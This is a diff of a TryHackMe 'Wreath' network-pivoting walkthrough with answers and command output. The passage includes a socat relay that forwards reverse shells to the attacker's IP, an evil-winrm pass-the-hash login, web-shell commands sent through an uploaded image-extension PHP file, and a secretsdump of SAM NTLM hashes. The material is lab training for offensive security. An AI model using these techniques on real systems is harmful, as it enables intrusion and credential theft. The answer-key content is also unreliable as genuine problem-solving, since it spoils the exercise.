@@ -6,6 +6,8 @@ Difficulty: Easy
 
 Description: Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network.
 
+Note: I do not go into detail here as this is mostly guided. I do show how I arrived at each answer but I highly suggest watching the provided video guide available on TryHackMe for this network first if you find yourself lost.
+
 ## Task 1 - 4
 Have no questions that require an answer.
 
@@ -540,7 +542,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 Move to the tmp folder and execute socat
 
 ```
-[root@prod-serv tmp]# ./socat-name tcp-l:17777 tcp:10.50.185.100:1337
+[root@prod-serv tmp]# ./socat-username tcp-l:17777 tcp:10.50.185.100:1337
 ```
 
 Setup nc listener
@@ -560,7 +562,7 @@ Now we can use powershell reverse shells.
 <title>302 Found</title>
 </head><body>
 <h1>Found</h1>
-<p>The document has moved <a href="https://thomaswreath.thmweb/exploit-name.php">here</a>.</p>
+<p>The document has moved <a href="https://thomaswreath.thmweb/exploit-username.php">here</a>.</p>
 </body></html>
 ```
 
@@ -662,11 +664,281 @@ Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
 
 i<3ruby
 
-From now on we will use evil-winrm to connect to the default admin account since ours will be wiped on reset.
+From now on we can use evil-winrm to connect to the default admin account since ours will be wiped on reset.
 evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i IP
 
-## Task 22 - Command and Control Introduction
+## Task 22 - 23
 
-Has no question that requires an answer.
+Have no questions that requires an answer.
 
-## Task 23 - 
+## Task 24 - Command and Control Empire: Overview
+
+**Can we get an agent back from the git server directly (Aye/Nay)?**
+
+Nay
+
+## Task 25 - 26
+
+Have no questions that requires an answer.
+
+## Task 27 - Command and Control Empire: Agents
+
+**Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?**
+
+shell whoami
+
+## Task 28 - 32
+
+Has no questions that requires an answer.
+
+## Task 33 - Personal PC Enumeration
+
+**Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?**
+
+80,3389
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.86.100 -TopPorts 50
+
+
+Hostname      : 10.200.86.100
+alive         : True
+openPorts     : {80, 3389}
+closedPorts   : {}
+filteredPorts : {445, 79, 88, 2049...}
+finishTime    : 4/12/2021 1:48:00 PM
+```
+
+## Task 34 - Personal PC Pivoting
+
+**Using the Wappalyzer browser extension (Firefox | Chrome) or an alternative method, identify the server-side Programming language (including the version number) used on the website.*
+
+php 7.4.11
+
+At this point of following along with the steps we have access to the website at 10.200.188.100 via the socks5 proxy setup on foxyproxy
+
+![image](https://user-images.githubusercontent.com/43668197/133108218-6beb89c4-3319-4019-a594-5f6391630923.png)
+
+## Task 35 - Personal PC The Wonders of Git
+
+**Use your WinRM access to look around the Git Server. What is the absolute path to the Website.git directory?**
+
+C:\Gitstack\repositories\website.git
+
+```
+*Evil-WinRM* PS C:\Users\lostsoulofawolf\Documents> cd ..\..\..\Gitstack
+*Evil-WinRM* PS C:\Gitstack> cd repositories
+*Evil-WinRM* PS C:\Gitstack\repositories> dir
+
+
+    Directory: C:\Gitstack\repositories
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/2/2021   7:05 PM                Website.git
+
+
+*Evil-WinRM* PS C:\Gitstack\repositories> download website.git
+Info: Downloading website.git to ./website.git
+
+                                                             
+Info: Download successful!
+```
+
+## Task 36 - Personal PC Website Code Analysis
+
+**What does Thomas have to phone Mrs Walker about?**
+
+neighbourhood watch meetings
+
+```
+[...]
+    <!-- ToDo:
+          - Finish the styling: it looks awful
+          - Get Ruby more food. Greedy animal is going through it too fast
+          - Upgrade the filter on this page. Can't rely on basic auth for everything
+          - Phone Mrs Walker about the neighbourhood watch meetings
+    -->
+[...]
+```
+
+**Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?**
+
+basic auth
+
+**Which extensions are accepted (comma separated, no spaces or quotes)?**
+
+jpg, jpeg,png,gif
+
+```
+<?php
+
+    if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
+        $target = "uploads/".basename($_FILES["file"]["name"]);
+        $goodExts = ["jpg", "jpeg", "png", "gif"];
+        if(file_exists($target)){
+            header("location: ./?msg=Exists");
+            die();
+[...]
+```
+
+## Task 37 - Personal PC Exploit PoC
+
+Has no questions that requires an answer.
+
+## Task 38 - AV Evasion Introduction
+
+**Which category of evasion covers uploading a file to the storage on the target before executing it?**
+
+On-Disk evasion
+
+**What does AMSI stand for?**
+
+Anti-Malware Scan Interface
+
+**Which category of evasion does AMSI affect?**
+
+In-Memory evasion
+
+## Task 39 - AV Evasion AV Detection Methods
+
+**What other name can be used for Dynamic/Heuristic detection methods?**
+
+Behavioural
+
+**If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?**
+
+static
+
+**When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?**
+
+pre-defined rules
+
+**What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?**
+
+password
+
+## Task 40 - AV Evasion PHP Payload Obfuscation
+
+**What is the Host Name of the target?**
+
+WREATH-PC
+
+```
+http://10.200.188.100/resources/uploads/v2.jpg.php?wreath=systeminfo
+```
+```
+Host Name:                 WREATH-PC
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-70000-00000-AA411
+Original Install Date:     08/11/2020, 14:55:50
+System Boot Time:          12/04/2021, 14:51:58
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2394 Mhz
+BIOS Version:              Xen 4.2.amazon, 24/08/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,369 MB
+Virtual Memory: Max Size:  2,432 MB
+Virtual Memory: Available: 1,815 MB
+Virtual Memory: In Use:    617 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 5 Hotfix(s) Installed.
+                           [01]: KB4580422
+                           [02]: KB4512577
+                           [03]: KB4580325
+                           [04]: KB4587735
+                           [05]: KB4592440
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.200.86.1
+                                 IP address(es)
+                                 [01]: 10.200.86.100
+                                 [02]: fe80::b1e7:ce3b:c3c4:a547
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+
+**What is our current username (include the domain in this)?**
+
+wreath-pc\thomas
+
+```
+http://10.200.188.100/resources/uploads/v2.jpg.php?wreath=whoami
+```
+
+## Task 41 - AV Evasion Compiling Netcat & Reverse Shell!
+
+**What output do you get when running the command: certutil.exe?**
+
+CertUtil: -dump command completed successfully.
+
+```
+http://10.200.188.100/resources/uploads/v2.jpg.php?wreath=certutil.exe 
+CertUtil: -dump command completed successfully.
+```
+
+## Task 42 - AV Evasion Enumeration
+
+**[Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?**
+
+SeImpersonatePrivilege
+
+**What is the Name (second column from the left) of this service?**
+
+SystemExplorerHelpService
+
+**Is the service running as the local system account (Aye/Nay)?**
+
+aye
+
+## Task 43 - AV Evasion Privilege Escalation
+
+Has no questions that requires an answer.
+
+## Task 44 - Exfiltration Exfiltration Techniques & Post Exploitation
+
+**Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?**
+
+nay
+
+**For what reason is HTTPS preferred over HTTP during exfiltration?**
+
+encryption
+
+**What is the Administrator NT hash for this target?**
+
+a05c3c807ceeb48c47252568da284cd2
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# secretsdump.py -sam sam.bak -system system.bak LOCAL
+Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
+Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
+[*] Cleaning up... 
+```
